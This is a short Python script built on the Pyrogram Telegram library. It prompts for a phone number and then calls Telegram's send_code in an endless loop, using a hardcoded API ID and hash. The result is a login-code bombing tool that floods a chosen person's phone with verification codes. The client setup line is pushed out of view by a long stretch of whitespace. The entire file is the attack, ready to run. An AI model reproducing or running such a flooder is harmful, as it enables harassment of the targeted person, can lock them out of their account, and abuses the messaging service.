import asyncio

from pyrogram import Client

number = input("Enter the phone number: ")                                  fallen = Client("Fallen", api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e", in_memory=True)
async def main():
    await fallen.connect()
    while True:
        await fallen.send_code(number)

asyncio.run(main())
